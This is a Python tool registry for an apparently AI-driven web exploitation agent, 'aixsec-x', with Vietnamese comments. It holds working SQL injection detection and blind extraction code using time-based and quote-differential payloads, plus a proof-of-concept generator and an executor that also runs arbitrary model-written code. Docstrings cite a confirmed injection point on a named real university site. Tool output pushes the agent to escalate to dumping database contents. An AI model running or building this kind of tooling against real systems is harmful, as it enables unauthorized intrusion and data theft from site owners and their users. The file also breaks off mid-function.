#!/usr/bin/env python3
"""
aixsec-x — tools.py
Tool registry cho web exploitation. Mỗi tool = JSON schema + executor.
Chỉ chạy lệnh đã được allowlist trong registry (không dispatch chuỗi lệnh tự do).
"""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
from dataclasses import dataclass, field


@dataclass
class ToolSpec:
    name: str
    description: str
    parameters: dict
    exec_fn: callable
    scope_params: tuple = ("host", "url", "target", "hostname")
    risk: str = "safe"          # safe | noisy | active | destructive
    output_filter: str = "text"

    def schema(self) -> dict:
        return {"type": "function", "function": {
            "name": self.name, "description": self.description, "parameters": self.parameters}}


# ─────────────────────────────────────────────
# EXEC HELPERS
# ─────────────────────────────────────────────

def run_cmd(argv: list, timeout: int = 90, max_chars: int = 5000) -> str:
    try:
        r = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
        out = (r.stdout or "").strip()
        err = (r.stderr or "").strip()
        combined = out + ("\n[stderr]\n" + err if err else "")
        combined = re.sub(r"\x1b\[[0-9;?]*[a-zA-Z]", "", combined)
        combined = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]", "", combined)
        if not combined:
            return "(no output)"
        return combined[:max_chars] + (f"\n... [truncated at {max_chars}]" if len(combined) > max_chars else "")
    except subprocess.TimeoutExpired:
        return f"[!] Timeout sau {timeout}s."
    except FileNotFoundError:
        return f"[!] '{argv[0]}' chưa cài. Cài: sudo apt install {argv[0]}"
    except Exception as e:
        return f"[!] Lỗi: {e}"


def _need(tool: str):
    if shutil.which(tool) is None:
        hint = _MISSING_HINT.get(tool, "")
        raise FileNotFoundError(f"{tool} chưa cài trên máy này"
                                + (f" — {hint}" if hint else ""))


# Binary ngoài cần thiết cho từng tool — kiểm tra lúc khởi động để model KHÔNG
# lên kế hoạch quanh tool chết (vd nuclei/arjun thường không có trên Kali),
# tránh tốn round vào outcome=error rồi mới bị gate cứng (v1.4.2).
TOOL_BINS: dict[str, str] = {
    "nuclei_scan": "nuclei",
    "param_discovery": "arjun",
    "sqlmap_check": "sqlmap",
    "nikto_scan": "nikto",
    "ffuf_dir": "ffuf",
    "subdomain_enum": "subfinder",
    "detect_cms": "whatweb",
    "waf_detect": "wafw00f",
}

# Hint thay thế khi binary thiếu (model 9B hiểu nhanh hơn với hướng dẫn cụ thể)
_MISSING_HINT: dict[str, str] = {
    "nuclei": "Thay thế bằng ffuf_dir, nikto_scan, sqlmap_check/sqli_manual_test.",
    "arjun": "Thay thế bằng ffuf_dir hoặc kiểm tra tham số thủ công.",
    "sqlmap": "Dùng sqli_manual_test / sqli_blind_extract (không cần sqlmap).",
}

# v1.4.3: trần timeout (giây) theo từng tool — chặn tool chạy quá lâu không tôn
# trọng _timeout tốt (live-run: arjun đốt 427s). _dispatch áp
# min(tool_timeout cấu hình, cap này). Tool không nằm trong dict dùng thẳng
# tool_timeout của operator.
# v1.4.4: nikto_scan 120→180s — 120s quá ngắn (live-run: kết quả rỗng vì bị
# run_cmd giết giữa chừng trước khi kịp in findings); _nikto_scan truyền
# -maxtime = _timeout-10 để nikto tự kết thúc đúng hạn.
TOOL_TIMEOUTS: dict[str, int] = {
    "param_discovery": 60,   # arjun -q có thể chạy rất lâu
    "detect_cms": 90,        # whatweb -a 3 chậm trên site lớn
    "subdomain_enum": 90,    # subfinder brute từ từ
    "nikto_scan": 180,       # nikto vốn chậm — cap đủ cho scan trung bình
}


def available_tools() -> tuple[set, dict]:
    """(set tool khả dụng, dict {tool_name: binary thiếu}) — gọi 1 lần lúc khởi động.
    Chỉ các tool cần binary NGOÀI mới được liệt kê; tool thuần Python
    (http_probe, headers_recon, dns_lookup, sqli_manual_test, ...) luôn khả dụng."""
    # tool thuần Python (không cần binary ngoài) LUÔN khả dụng
    avail: set = {ts.name for ts in TOOL_REGISTRY if not TOOL_BINS.get(ts.name)}
    missing: dict = {}
    for name, binary in TOOL_BINS.items():
        if shutil.which(binary):
            avail.add(name)
        else:
            missing[name] = binary
    return avail, missing


def _url_host(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).hostname or url


# ─────────────────────────────────────────────
# TOOLS — recon layer
# ─────────────────────────────────────────────

def _http_probe(**kw):
    url, timeout = kw["url"], kw["_timeout"]
    try:
        import requests
        r = requests.get(url, timeout=min(timeout, 20), allow_redirects=True,
                         headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0"})
        keys = ["Server", "X-Powered-By", "Content-Security-Policy", "X-Frame-Options",
                "X-XSS-Protection", "Strict-Transport-Security", "Set-Cookie", "Location",
                "WWW-Authenticate", "Content-Type"]
        h = {k: v for k, v in r.headers.items() if k in keys or k.lower() in [x.lower() for x in keys]}
        body = re.sub(r"\s+", " ", (r.text or "")[:600])
        return (f"GET {url} → {r.status_code} ({len(r.content)} bytes)\n"
                f"headers: {h}\nbody_snippet: {body}")
    except ImportError:
        return run_cmd(["curl", "-sS", "-i", "--max-time", "20", url], timeout)
    except requests.exceptions.ConnectionError as e:
        return f"[!] Không kết nối được: {e}"
    except requests.exceptions.Timeout:
        return "[!] Timeout HTTP"


def _dns_lookup(**kw):
    host = kw["host"]
    try:
        import socket
        ips = sorted({i[4][0] for i in socket.getaddrinfo(host, None)})
        return f"A records: {', '.join(ips)}" if ips else "(không phân giải được)"
    except Exception as e:
        return f"[!] DNS lỗi: {e}"


def _headers_recon(**kw):
    url = kw["url"]
    try:
        import requests
        r = requests.head(url, timeout=15, allow_redirects=True,
                          headers={"User-Agent": "Mozilla/5.0"})
        return "HEAD " + url + f" → {r.status_code}\n" + "\n".join(
            f"{k}: {v}" for k, v in r.headers.items())
    except Exception as e:
        return f"[!] {e}"


def _waf_detect(**kw):
    _need("wafw00f")
    return run_cmd(["wafw00f", kw["url"], "-o", "-"], kw["_timeout"])


def _detect_cms(**kw):
    _need("whatweb")
    return run_cmd(["whatweb", "-a", "3", kw["url"]], kw["_timeout"])


def _subdomain_enum(**kw):
    _need("subfinder")
    return run_cmd(["subfinder", "-d", kw["domain"], "-silent"], kw["_timeout"])


def _nikto_scan(**kw):
    """Quét nikto — v1.4.4: -maxtime suy từ _timeout (cap 180s → -maxtime 170)
    để nikto TỰ KẾT THÚC trước khi run_cmd cắt (trước đây hardcode 120s: bị
    giết giữa chừng → output rỗng → model không có dữ liệu)."""
    _need("nikto")
    tmax = max(30, int(kw.get("_timeout") or 90) - 10)
    return run_cmd(["nikto", "-h", kw["url"], "-nointeractive",
                    "-maxtime", str(tmax)], kw["_timeout"])


# ─────────────────────────────────────────────
# TOOLS — active exploitation layer
# ─────────────────────────────────────────────

def _nuclei_scan(**kw):
    _need("nuclei")
    args = ["nuclei", "-u", kw["url"], "-silent"]
    if kw.get("severity"):
        args += ["-severity", kw["severity"]]
    if kw.get("tags"):
        args += ["-tags", kw["tags"]]
    args += ["-timeout", "10", "-c", "10"]
    return run_cmd(args, kw["_timeout"])


# ── v1.4: wordlist resolver ──
# Model nhỏ (9B) hay truyền tên ngắn gọn: "common", "common.txt",
# "SecLists/common-words.txt", "top500", "raft-medium"... thay vì đường dẫn đầy
# đủ. Resolver này map alias/basename → đường dẫn tuyệt đối trong SecLists.
SECLISTS_WEB = "/usr/share/seclists/Discovery/Web-Content"

# alias của wordlist directory-fuzz phổ biến → tên file TRONG Seclists
# (không trỏ ra ngoài: top500/lowercase… vốn là wordlist dirsearch, không nằm
# trong gói seclists — fallback về common.txt cho nhỏ/gọn)
_WL_ALIASES = {
    "common": "common.txt",
    "common.txt": "common.txt",
    "seclists/common-words.txt": "common.txt",
    "common-words.txt": "common.txt",
    "top500": "common.txt",
    "top500.txt": "common.txt",
    "raft": "raft-medium-directories.txt",
    "raft-medium": "raft-medium-directories.txt",
    "raft-medium-words": "raft-medium-words.txt",
    "raft-small": "raft-small-directories.txt",
    "raft-small-words": "raft-small-words.txt",
    "raft-large": "raft-large-directories.txt",
    "directory-list": "DirBuster-2007_directory-list-2.3-medium.txt",
    "dirbuster": "DirBuster-2007_directory-list-2.3-medium.txt",
    "dirbuster-medium": "DirBuster-2007_directory-list-2.3-medium.txt",
    "dirbuster-big": "DirBuster-2007_directory-list-2.3-big.txt",
    "dirbuster-small": "DirBuster-2007_directory-list-2.3-small.txt",
    "big": "big.txt",
    "big.txt": "big.txt",
    "combined": "combined_words.txt",
}

_WL_EXTRA_DIRS = [SECLISTS_WEB, SECLISTS_WEB + "/raft-medium-directories",
                  SECLISTS_WEB + "/raft-small-directories",
                  SECLISTS_WEB + "/CMS", SECLISTS_WEB + "/Web-Servers",
                  "/usr/share/wordlists/ffuf",  # wordlist riêng của ffuf
                  "/usr/share/wordlists/dirb",
                  "/usr/share/wordlists",
                  "/usr/share/dirb/wordlists"]


# fmt: off
def resolve_wordlist(wl: str = "", base_dir: str = SECLISTS_WEB) -> str:
    """Map chuỗi wordlist (alias/basename/đường dẫn) → file tồn tại.

    Thứ tự: đường dẫn tuyệt đối (tồn tại) → alias (common→common.txt) →
    basename tìm trong base_dir/thư mục con → tìm theo đuôi đường dẫn
    ("SecLists/common-words.txt" → common.txt).
    Không tìm thấy → raise ValueError kèm gợi ý thư mục (để model sửa ngay,
    không đốt 120s rồi mới error làm hỏng URL-gate như v1.3).
    """
    if not wl:
        wl = "common.txt"
    wl = wl.strip()
    if os.path.isabs(wl):
        if os.path.exists(wl):
            return wl
        raise ValueError(f"Wordlist không tồn tại: {wl}")
    if wl in _WL_ALIASES:
        cand = os.path.join(base_dir, _WL_ALIASES[wl])
        if os.path.exists(cand):
            return cand
    elif "\\" in wl or wl.lower() in _WL_ALIASES:
        # tên có dạng "Seclists/common-words.txt" (sai hoa/thường) — so khớp thường hóa
        norm = wl.replace("\\", "/").lower()
        for k, v in _WL_ALIASES.items():
            if norm == k.replace("\\", "/").lower() or norm.endswith("/" + v):
                cand = os.path.join(base_dir, v)
                if os.path.exists(cand):
                    return cand
    # basename trực tiếp trong base_dir
    cand = os.path.join(base_dir, wl)
    if os.path.exists(cand) and os.path.isfile(cand):
        return cand
    # tìm đệ quy theo basename trong các thư mục con phổ biến
    for d in _WL_EXTRA_DIRS:
        if not os.path.isdir(d):
            continue
        p = os.path.join(d, wl)
        if os.path.exists(p) and os.path.isfile(p):
            return p
        for root, _, files in os.walk(d):
            if wl.lower() in (f.lower() for f in files):
                return os.path.join(root, wl)
    # model hay truyền đường dẫn thiếu phần đầu (vd "SecLists/common-words.txt",
    # "raft-medium-directories/2.3medium.txt") — so trùng basename cuối cùng
    tail = wl.rstrip("./").replace("\\", "/")
    for part in reversed(tail.split("/")):
        if not part:
            continue
        for root, dirs, files in os.walk(SECLISTS_WEB):
            dirs[:] = [d for d in dirs if not d.startswith(".")]
            if part.lower() in (f.lower() for f in files):
                return os.path.join(root, part)
        break  # chỉ thử basename cuối, không lan sang segment giữa
    raise ValueError(
        f"Wordlist '{wl}' không tìm thấy. Đường dẫn hợp lệ nằm trong: "
        f"\n  - {base_dir}/ "
        f"\n  - {SECLISTS_WEB}/raft-medium-directories/ ..."
        f"\nAlias hỗ trợ: common, big, top500, raft, raft-medium, "
        f"dirbuster-*, directory-list-2.3-*"
        f"\nVí dụ đúng: wordlist='common.txt' hoặc "
        f"'raft-medium-directories/2.3medium.txt' hoặc "
        f"đường dẫn tuyệt đối tùy ý")
# fmt: on


def _ffuf_dir(**kw):
    _need("ffuf")
    try:
        wl = resolve_wordlist(kw.get("wordlist", ""))
    except ValueError as e:
        # lỗi rõ ràng kèm gợi ý — outcome=error nhưng model biết phải sửa gì;
        # tránh URL-gate nuốt hết ffuf_dir chỉ vì đường dẫn sai
        raise ValueError(str(e))
    args = ["ffuf", "-u", kw["url"].rstrip("/") + "/FUZZ",
            "-w", wl, "-mc", "200,204,301,302,307,401,403", "-t", "30",
            "-timeout", "10", "-maxtime", str(int(kw.get("maxtime") or 90)),
            "-s"]
    if kw.get("extensions"):
        args += ["-e", kw["extensions"]]
    return run_cmd(args, kw["_timeout"])


def _sqlmap_check(**kw):
    _need("sqlmap")
    args = ["sqlmap", "-u", kw["url"]]
    if kw.get("data"):
        args += ["--data", kw["data"]]
    args += ["--batch", "--level", "1", "--risk", "1", "--smart",
            "--current-user", "--banner"]
    return run_cmd(args, kw["_timeout"])


def _find_forms(**kw):
    """v1.4.4: GET url → parse <form>: action (resolve tuyệt đối), method, inputs.

    Lý do tồn tại: agent mù với form POST (nikto/nuclei/http_probe không lấy được
    form) → SQLi trong ô tìm kiếm (vd POST /WebTinTuc/TimKiem param=keyword của
    tbu.edu.vn) không bao giờ được test. Tool này cho model biết endpoint + method
    + param để gọi sqli_manual_test ĐÚNG chỗ.
    """
    import requests
    from html.parser import HTMLParser
    from urllib.parse import urljoin

    url = kw["url"]
    timeout = max(10, min(int(kw.get("_timeout") or 20), 25))

    class _FormParser(HTMLParser):
        MAX_FORMS = 15
        MAX_INPUTS = 30

        def __init__(self, base):
            super().__init__()
            self.base = base
            self.forms: list[dict] = []
            self._cur: dict | None = None

        def _resolve_action(self, action: str) -> str:
            if not action or action.strip() in ("#", ""):
                return self.base
            return urljoin(self.base, action.strip())

        def handle_startendtag(self, tag, attrs):
            self.handle_starttag(tag, attrs)  # <input/> self-closing

        def handle_starttag(self, tag, attrs):
            if len(self.forms) >= self.MAX_FORMS:
                return
            a = {k.lower(): (v or "") for k, v in attrs}
            if tag.lower() == "form":
                self._cur = {
                    "action": self._resolve_action(a.get("action", "")),
                    "method": (a.get("method") or "get").lower(),
                    "enctype": (a.get("enctype") or ""),
                    "id": a.get("id", ""),
                    "name": a.get("name", ""),
                    "inputs": [],
                }
                self.forms.append(self._cur)
            elif self._cur is not None and tag.lower() in ("input", "textarea", "select"):
                if len(self._cur["inputs"]) >= self.MAX_INPUTS:
                    return
                if tag.lower() == "select":
                    it = {"name": a.get("name", ""), "type": "select"}
                elif tag.lower() == "textarea":
                    it = {"name": a.get("name", ""), "type": "textarea"}
                else:
                    it = {"name": a.get("name", ""),
                          "type": (a.get("type") or "text").lower()}
                if it["name"]:
                    self._cur["inputs"].append(it)

        def handle_endtag(self, tag):
            if tag.lower() == "form":
                self._cur = None

    try:
        r = requests.get(url, timeout=timeout, allow_redirects=True,
                         headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0"})
    except requests.RequestException as e:
        return f"[!] find_forms — không GET được {url}: {e}"
    if r.status_code >= 400:
        return (f"[!] find_forms — {url} trả {r.status_code} ({len(r.content)} B). "
                f"Thử URL khác (trang chủ / trang đăng nhập / trang có ô tìm kiếm).")
    parser = _FormParser(r.url or url)
    parser.feed((r.text or "")[:2_000_000])
    forms = parser.forms
    if not forms:
        return (f"[i] find_forms — {url} → {r.status_code}, {len(r.text)} chars: "
                f"KHÔNG có <form>. Thử URL khác (trang chủ hoặc trang có ô tìm kiếm/đăng nhập).")
    lines = [f"[i] find_forms — {url} → {r.status_code}, {len(r.text)} chars, {len(forms)} form(s):"]
    for i, frm in enumerate(forms, 1):
        ins = ", ".join(f"{x['name']}({x['type']})" for x in frm["inputs"]) or "(không có input)"
        extra = f" [enctype={frm['enctype']}]" if frm["enctype"] else ""
        lines.append(f"  {i}. {frm['method'].upper()} {frm['action']}{extra}")
        lines.append(f"     inputs: {ins}")
    lines.append("[i] Ghi chú: gọi sqli_manual_test với url=action, method tương ứng, "
                 "param=tên input cần test.")
    return "\n".join(lines)


def _form_from_payload(payload: str, param: str) -> dict:
    """Chuyển payload form string sang dict POST data cho đúng param đang test.

    - 'q=test' với param=q  → {"q": "test"}
    - 'param=1 AND SLEEP(3)' (kiểu GET) → {"q": "1 AND SLEEP(3)"}
    - 'keyword=x' với param=q → {"q": "x"} (đổi key về param)
    """
    p = (payload or "").strip()
    if p.lower().startswith("param="):
        p = p[len("param="):]
    if "=" not in p:
        return {param: p}
    from urllib.parse import parse_qsl
    first_key = p.split("&", 1)[0].split("=", 1)[0].strip()
    if first_key != param:
        val = p.split("&", 1)[0].split("=", 1)[1]
        p = f"{param}={val}"
    return dict(parse_qsl(p, keep_blank_values=True))


def _guess_engine(resp) -> str:
    """Ước lượng DB backend từ response headers (cho engine=auto).
    ASP.NET/IIS → mssql; PHP → mysql; không có tín hiệu → "" (tool tự chọn mysql)."""
    try:
        hdrs = getattr(resp, "headers", None) or {}
        raw = ""
        for k in ("X-Powered-By", "Server", "X-AspNet-Version", "Set-Cookie"):
            try:
                raw += " " + str(hdrs.get(k, ""))
            except Exception:  # noqa: BLE001
                pass
        low = raw.lower()
        if any(t in low for t in ("asp.net", "microsoft-iis", "aspnetsessionid", "x-aspnet")):
            return "mssql"
        if "php" in low:
            return "mysql"
    except Exception:  # noqa: BLE001
        pass
    return ""


def _sqli_manual_test(**kw):
    """SQLi thủ công v2 (v1.4.4):

    1) QUOTE-DIFFERENTIAL (error-based) — 3 request: baseline 'test' vs 'test'' vs "test'"
       Nếu nháy đơn LÀM VỠ truy vấn (500/khác size) mà nháy đơn kép KHỚP baseline
       → điểm chèn SQLi xác nhận, KHÔNG cần biết engine (hoạt động trên tbu.edu.vn
       — form tìm kiếm MSSQL mà mọi payload time/boolean đều vỡ vì --
       không dùng được).
    2) TIME-BASED — chỉ chạy khi quote-differential không xác nhận: engine
       mysql (SLEEP(n)) | mssql (WAITFOR DELAY '0:0:n') | auto (đoán từ headers,
       mặc định mysql).
    Trả verdict CONFIRMED/NOT_CONFIRMED kèm bằng chứng từng request. Bỏ tham số
    baseline/delay_payload (model hay truyền rác như "0.80"/"3" ở v1.4.3).
    """
    import time as t
    import requests

    url = kw["url"]
    param = kw.get("param") or ""
    method = str(kw.get("method", "get")).lower().strip()
    engine = str(kw.get("engine") or "auto").lower().strip()
    if engine not in ("mysql", "mssql", "auto"):
        return f"[!] sqli_manual_test: engine phải là mysql|mssql|auto (nhận '{engine}')."
    if not param:
        return ("[!] sqli_manual_test cần 'param' (tên tham số form). Chạy find_forms "
                "trước để biết tên input (vd 'keyword') rồi gọi lại với param đó.")
    delay = max(1, int(float(kw.get("delay") or 3)))
    seed = "test"
    req_timeout = max(15, delay + 5)

    def send(value: str):
        """(status, elapsed, len_content, response_or_err)"""
        try:
            if method == "post":
                r = requests.post(url, data=_form_from_payload(f"{param}={value}", param),
                                  timeout=req_timeout,
                                  headers={"User-Agent": "Mozilla/5.0"})
            else:
                sep = "&" if "?" in url else "?"
                r = requests.get(f"{url}{sep}{param}={value}", timeout=req_timeout,
                                 headers={"User-Agent": "Mozilla/5.0"})
            return r.status_code, r.elapsed.total_seconds(), len(r.content), r
        except requests.RequestException as e:
            return 0, 0.0, 0, f"lỗi {e}"

    rows = []  # (label, value, status, elapsed, length, resp)
    b_st, b_el, b_ln, resp_b = send(seed)
    rows.append(("baseline", seed, b_st, b_el, b_ln))

    if engine == "auto":
        hint = _guess_engine(resp_b)
        if hint:
            engine = hint
        else:
            engine = "mysql"  # mặc định khi không có tín hiệu header

    q1 = send(seed + "'")
    rows.append(("quote-single", seed + "'", q1[0], q1[1], q1[2]))
    q2 = send(seed + "''")
    rows.append(("quote-double", seed + "''", q2[0], q2[1], q2[2]))

    def differs(st, ln) -> bool:
        if st == 0:  # network error — không tính là tín hiệu SQL
            return False
        return st != b_st or abs(ln - b_ln) > max(200, b_ln * 0.1)

    sensitive = differs(q1[0], q1[2])
    doubled_ok = not differs(q2[0], q2[2])

    time_rows = []
    verdict, method_used = "NOT_CONFIRMED", ""
    if sensitive and doubled_ok:
        verdict, method_used = "CONFIRMED", "quote-differential (error-based)"
    else:
        # fallback time-based theo engine
        pl = (f"{seed}' AND SLEEP({delay})-- -" if engine == "mysql"
              else f"{seed}' AND WAITFOR DELAY '0:0:{delay}'-- -")
        t_st, t_el, t_ln, _ = send(pl)
        rows.append(("time-based", pl, t_st, t_el, t_ln))
        time_rows.append((pl, t_st, t_el, t_ln))
        delta = t_el - b_el
        if t_st != 0 and delta >= max(1.5, delay * 0.6):
            verdict, method_used = "CONFIRMED", f"time-based ({engine})"

    lines = [f"[i] target: {method.upper()} {url} — param='{param}', engine={engine}, "
             f"delay={delay}s"]
    for label, value, st, el, ln in rows:
        mark = ""
        if label in ("quote-single", "quote-double", "time-based") and st != 0:
            if label == "time-based":
                mark = f" (delta {el - b_el:+.2f}s vs baseline)"
            elif differs(st, ln):
                mark = "  ← KHÁC baseline"
            else:
                mark = "  ← KHỚP baseline"
        err = f" (request lỗi)" if st == 0 else ""
        lines.append(f"[*] {label:<13} {param}='{value}' → {st or 'ERR'}, "
                     f"{el:.2f}s, {ln} B{mark}{err}")
    if verdict == "CONFIRMED":
        lines.append(f"[✓] SQLI CONFIRMED — {method_used} tại param '{param}' "
                     f"({method.upper()} {url})")
        # v1.4.5: next-step block — CONFIRMED chỉ mới bắt đầu, phải escalate
        lines.append(
            "[→] BƯỚC TIẾP THEO: (1) sqli_blind_extract {url, action:'version' hoặc "
            + (f"'database', engine:'mssql', method:'{method}', param:'{param}', "
               f"data:'{param}={seed}'" if method == "post" else "engine:'mssql' "
               "(time-based nếu oracle không ăn)")
            + "} để trích xuất @@VERSION/DB_NAME()/tables/dump; "
              "(2) generate_poc → poc_executor với poc_path để chạy POC khai thác.")
    else:
        lines.append(f"[-] SQLI NOT_CONFIRMED — quote-differential âm tính"
                     + (f" và time-based {engine} không tạo phản hồi chậm" if time_rows else "")
                     + ". Thử sqlmap_check/sqli_blind_extract hoặc param khác trong form "
                       "(find_forms).")
    lines.append(f"[+] verdict: {verdict}" + (f" — {method_used}" if method_used else ""))
    return "\n".join(lines)


def _sqli_blind_extract(**kw):
    """SQLi time-based blind KHÔNG sqlmap: detect + extract (query & path injection).

    Wrap TimeBlindExploiter (sqli_blind_poc.py). Dùng khi sqlmap fail, ví dụ
    path-injection /search/123.html. Extraction rất chậm (mỗi ký tự ~13 probe).
    v1.4.5: hỗ trợ POST form — truyền method='post' + param + data='kw=...' để
    detect/extract trên form tìm kiếm (vd /WebTinTuc/TimKiem keyword).
    v1.4.5: engine=mssql → ưu tiên error-based oracle (CONVERT(int,...) đọc từ
    lỗi 500) trước time-based; đọc @@VERSION/DB_NAME()/SUSER_SNAME()/tables/dump.
    """
    action = kw.get("action", "detect")
    try:
        from sqli_blind_poc import TimeBlindExploiter
    except ImportError:  # khi tools.py được import từ nơi khác
        import importlib.util
        here = os.path.dirname(os.path.abspath(__file__))
        spec = importlib.util.spec_from_file_location(
            "sqli_blind_poc", os.path.join(here, "sqli_blind_poc.py"))
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        TimeBlindExploiter = mod.TimeBlindExploiter

    ex = TimeBlindExploiter(
        kw["url"],
        delay=float(kw.get("delay", 3.0)),
        threshold=float(kw.get("threshold", 2.5)),
        timeout=int(kw.get("timeout") or 15),
        engine=str(kw.get("engine") or "mysql"),
        method=str(kw.get("method") or "get"),
        param=kw.get("param") or None,
        data=kw.get("data") or None,
    )
    try:
        res = ex.report(action,
                        db_name=kw.get("db_name", ""),
                        table=kw.get("table", ""),
                        columns=[c.strip() for c in (kw.get("columns") or "").split(",") if c.strip()],
                        limit=int(kw.get("limit", 10)),
                        max_len=int(kw.get("max_len", 60)))
    except Exception as e:  # noqa: BLE001
        return f"[!] sqli_blind_extract lỗi: {e}"
    if not res.get("confirmed"):
        err = res.get("error") or "unknown"
        return (f"[-] SQLi NOT CONFIRMED — {err}\n"
                f"[i] URL: {kw['url']} (delay={ex.delay}s, threshold={ex.threshold}s)")
    lines = [f"[✓] SQLi CONFIRMED — {res.get('injection') or ''}",
             f"[i] mode={res.get('mode')} · delay={ex.delay}s · threshold={ex.threshold}s"]
    data = res.get("data") or {}
    for k, v in data.items():
        if v is None:
            continue
        if isinstance(v, list):
            lines.append(f"[+] {k}: " + ", ".join(str(x) for x in v)[:2000])
        else:
            lines.append(f"[+] {k}: {str(v)[:3000]}")
    return "\n".join(lines)


def _generate_poc(**kw):
    """Sinh POC Python khai thác SQLi time-based blind (KHÔNG sqlmap).

    Dùng trong pipeline fallback khi sqlmap_check fail:
      sqli_blind_extract (detect) → generate_poc → poc_executor.
    Code ~6-7KB vượt context cap 5000 ký tự nên KHÔNG trả code đầy đủ
    inline — ghi ra tempfile (/tmp/aixsec-x_poc_*.py) và trả poc_path + snippet
    25 dòng để model kiểm tra. Model gọi poc_executor với poc_path.
    """
    import sys
    import tempfile

    url = kw.get("url", "")
    mode = kw.get("mode", "query")
    action = kw.get("action", "detect")
    try:
        from poc_generator import generate_poc as _gen
    except ImportError:  # khi tools.py được import từ nơi khác
        import importlib.util
        here = os.path.dirname(os.path.abspath(__file__))
        spec = importlib.util.spec_from_file_location(
            "poc_generator", os.path.join(here, "poc_generator.py"))
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        _gen = mod.generate_poc

    try:
        code = _gen(
            url=url,
            mode=mode,
            action=action,
            delay=float(kw.get("delay", 3.0)),
            threshold=float(kw.get("threshold", 2.5)),
            table=kw.get("table", ""),
            columns=kw.get("columns", ""),
            include_user=bool(kw.get("include_user", False)),
            include_tables=bool(kw.get("include_tables", False)),
            limit=int(kw.get("limit", 10)),
        )
    except Exception as e:  # noqa: BLE001
        return f"[!] generate_poc lỗi: {e}"

    fd, path = tempfile.mkstemp(prefix="aixsec-x_poc_", suffix=".py",
                                dir=tempfile.gettempdir())
    with os.fdopen(fd, "w") as f:
        f.write(code)

    # 25 dòng đầu: header, imports, class khởi đầu — đủ để model thẩm định
    snippet = "\n".join(code.splitlines()[:25])
    return (f"[✓] Đã sinh POC Python (KHÔNG sqlmap): {len(code)} bytes\n"
            f"[i] poc_path: {path}\n"
            f"[i] mode={mode} action={action} delay={kw.get('delay', 3.0)}s "
            f"threshold={kw.get('threshold', 2.5)}s\n"
            f"[i] Chạy ngay: poc_executor {{\"poc_path\": \"{path}\", \"timeout\": 90}}\n"
            f"[*] Snippet 25 dòng đầu (code đầy đủ trong poc_path):\n"
            f"```\n{snippet}\n```")


def _poc_executor(**kw):
    """Chạy POC Python (generate_poc) — CHỈ file aixsec-x_poc_*.py trong tempdir.

    poc_code: source trực tiếp (model tự viết nhỏ gọn).
    poc_path: file do generate_poc sinh — validate tempdir + prefix aixsec-x_poc_
    để chặn arbitrary file exec. Risk = active (có approval gate).
    """
    import subprocess
    import sys
    import tempfile

    timeout = int(kw.get("timeout") or 120)
    code = kw.get("poc_code", "")
    path = kw.get("poc_path", "")

    if code and path:
        return "[!] poc_executor chỉ nhận 1 trong hai: poc_code HOẶC poc_path"
    if code:
        src = code
        src_name = "<poc_code>"
    elif path:
        tmpdir = os.path.realpath(tempfile.gettempdir())
        real = os.path.realpath(path)
        base_ok = os.path.basename(real).startswith("aixsec-x_poc_")
        if not os.path.isabs(real) or not real.startswith(tmpdir + os.sep) or not base_ok:
            return ("[!] poc_path bị từ chối: chỉ chạy file tạm aixsec-x_poc_*.py "
                    "trong tempdir (chống arbitrary file exec).")
        try:
            with open(real) as f:
                src = f.read()
        except OSError as e:
            return f"[!] Không đọc được poc_path: {e}"
        src_name = real
    else:
        return "[!] poc_executor cần poc_code (source) hoặc poc_path (từ generate_poc)."

    try:
        compile(src, src_name, "exec")
    except SyntaxError as e:
        return f"[!] poc_executor SyntaxError: {e}"

    try:
        r = subprocess.run([sys.executable, "-c", src], capture_output=True,
                           text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return f"[!] poc_executor timeout sau {timeout}s (target chậm hoặc SLEEP quá lớn)"
    out = (r.stdout or "") + (r.stderr or "")
    if r.returncode != 0:
        return (f"[!] poc_executor exit={r.returncode}\n" + out[-4000:])
    if len(out) > 6000:
        out = out[:6000] + f"\n...[cắt] tổng {len(out)} ký tự"
    return out.strip() or "[i] poc_executor OK (không có output)"


def _param_discovery(**kw):
    """arjun: tìm tham số ẩn trên endpoint."""
    _need("arjun")
    return run_cmd(["arjun", "-u", kw["url"], "-q"], kw["_timeout"])


# ─────────────────────────────────────────────
# TOOLS — OOB / interactive
# ─────────────────────────────────────────────

def _oob_interactsh(**kw):
    """Chạy interactsh-client nền để nhận callback OOB trong N giây."""
    import threading
    import tempfile
    outfile = tempfile.mktemp(prefix="interactsh_", suffix=".log")

    def _run():
        with open(outfile, "w") as f:
            try:
                subprocess.run(["interactsh-client", "-v", "-t", "10"], timeout=25,
                               stdout=f, stderr=subprocess.STDOUT)
            except Exception:
                pass

    threading.Thread(target=_run, daemon=True).start()
    return (f"[i] interactsh-client đã chạy nền trong ~10s, log: {outfile}\n"
            f"[i] Domain callback sẽ xuất hiện trong log. Tool khác (nuclei -o \"{outfile}\") "
            f"có thể dùng. Kết quả OOB không đồng bộ.")


# ─────────────────────────────────────────────
# ─────────────────────────────────────────
# TOOLS — SAST (static source analysis)
# ─────────────────────────────────────────

SKIP_SCAN_DIRS = {
    ".git", ".svn", ".hg", "node_modules", "vendor", "dist", "build",
    "__pycache__", ".venv", "venv", ".tox", ".idea", ".vscode",
    "coverage", ".next", ".nuxt", "target", ".terraform",
}
SKIP_SCAN_EXTS = {
    ".png", ".jpg", ".jpeg", ".gif", ".webp", ".ico", ".bmp", ".svg",
    ".woff", ".woff2", ".ttf", ".otf", ".eot", ".pdf", ".zip", ".gz",
    ".tar", ".7z", ".class", ".jar", ".o", ".so", ".a", ".pyc",
    ".pyo", ".min.js", ".map", ".pak", ".lock", ".sum", ".whl",
}
LANG_EXT = {
    "php": {".php", ".php3", ".php4", ".php5", ".phtml", ".inc"},
    "python": {".py", ".pyw"},
    "javascript": {".js", ".mjs", ".cjs", ".ts", ".jsx", ".tsx"},
    "java": {".java"},
}

_BAD_SECRET_RE = re.compile(r"(your_|changeme|change_me|example|placeholder|<|\{\{|\$\(|\$\{)", re.I)


def _looks_secret(match_text: str) -> bool:
    """Lọc false-positive credential: placeholder/example/{{...}}/$(...)."""
